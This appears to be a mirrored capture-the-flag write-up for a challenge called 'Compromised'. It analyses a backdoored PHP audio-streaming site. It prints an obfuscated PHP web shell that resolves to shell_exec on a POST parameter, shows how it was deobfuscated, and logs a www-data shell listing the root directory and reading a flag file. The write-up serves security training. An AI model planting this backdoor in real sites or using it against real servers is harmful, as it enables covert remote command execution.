# Source Zero Con Writeup – Compromised

> 原文: https://www.ctfiot.com/122471.html
> ID: 122471


```
Someone keeps hacking my audio streaming website and I don't know how! I think they left a backdoor or something! Can you take a look at it?
Did you find anything interesting yet? Is there a feature you can leverage to read the server-side code?
Now that you can read the server-side code, did you find any backdoor injected in them? If the answer is yes, try using that backdoor to read the flag located at the '/' directory!
<?php $_=``.[];
$__=@$_;
$_= $__[0];
 $_1 = $__[2];
 $_1++;
 $_1++;
$_1++;
$_1++;
$_1++;
$_1++;
$_++;
$_++;
$_0 = $_;
$_++;
$_2 = ++$_;
 $_55 = '_'.(','^'|').('/'^'`').('-'^'~').(')'^'}');
 $_ = $_2.$_1.$_2.$_0;
 $_($$_55[_]);
?>
127.0.0.1:
26423 [500]: GET /backdoor.php - Uncaught ValueError: shell_exec(): Argument #1 ($command) cannot be empty in /root/backdoor.php:1
Stack trace:
#0 /root/backdoor.php(1): shell_exec()
#1 {main}
 thrown in /root/backdoor.php on line 1
<?php $_=``.[];
127.0.0.1:
26724 [500]: GET /backdoor.php - Uncaught Error: Call to undefined function yjyw() in /root/backdoor.php:18
Stack trace:
#0 {main}
 thrown in /root/backdoor.php on line 18
$_($$_55[_]);
<?php $_=`id`.[];
$__=@$_;
$_= $__[0];
 $_1 = $__[2];
<snip>
$_++;
$_0 = $_;
$_++;
$_2 = ++$_;
 $_55 = '_'.(','^'|').('/'^'`').('-'^'~').(')'^'}');
echo $_55;
 $_ = $_2.$_1.$_2.$_0;
 //$_($$_55[_]);
?>
$_($_POST[_])
www-data@comprom-1uocqb-1687450894-f49f96585-wb4jp:/www$ id
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@comprom-1uocqb-1687450894-f49f96585-wb4jp:/www$ ls -al /
 ls -al /
 total 84
 drwxr-xr-x 1 root root 4096 Jun 22 16:21 .
 drwxr-xr-x 1 root root 4096 Jun 22 16:21 ..
 drwxr-xr-x 1 root root 4096 Nov 15 2022 bin
 drwxr-xr-x 2 root root 4096 Sep 3 2022 boot
 drwxr-xr-x 5 root root 360 Jun 22 16:21 dev
 drwxr-xr-x 1 root root 4096 Jun 22 16:21 etc
 -rw-r--r-- 1 root root 35 Jun 22 13:28 flag_3_7764865c46bfce2c138e77ae5407354e.txt
 drwxr-xr-x 2 root root 4096 Sep 3 2022 home
 drwxr-xr-x 1 root root 4096 Nov 15 2022 lib
 drwxr-xr-x 2 root root 4096 Nov 14 2022 lib64
 drwxr-xr-x 2 root root 4096 Nov 14 2022 media
 drwxr-xr-x 2 root root 4096 Nov 14 2022 mnt
 drwxr-xr-x 2 root root 4096 Nov 14 2022 opt
 dr-xr-xr-x 296 root root 0 Jun 22 16:21 proc
 drwx------ 1 root root 4096 Nov 15 2022 root
 drwxr-xr-x 1 root root 4096 Nov 15 2022 run
 drwxr-xr-x 1 root root 4096 Nov 15 2022 sbin
 drwxr-xr-x 2 root root 4096 Nov 14 2022 srv
 dr-xr-xr-x 13 root root 0 Jun 22 16:21 sys
 drwxrwxrwt 1 root root 4096 Jun 22 13:28 tmp
 drwxr-xr-x 1 root root 4096 Nov 14 2022 usr
 drwxr-xr-x 1 root root 4096 Nov 15 2022 var
 www-data@comprom-1uocqb-1687450894-f49f96585-wb4jp:/www$ cat flag_3_7764865c46bfce2c138e77ae5407354e.txt
 <w$ cat /flag_3_7764865c46bfce2c138e77ae5407354e.txt
 flag{p3rs1s<snip>32}
```
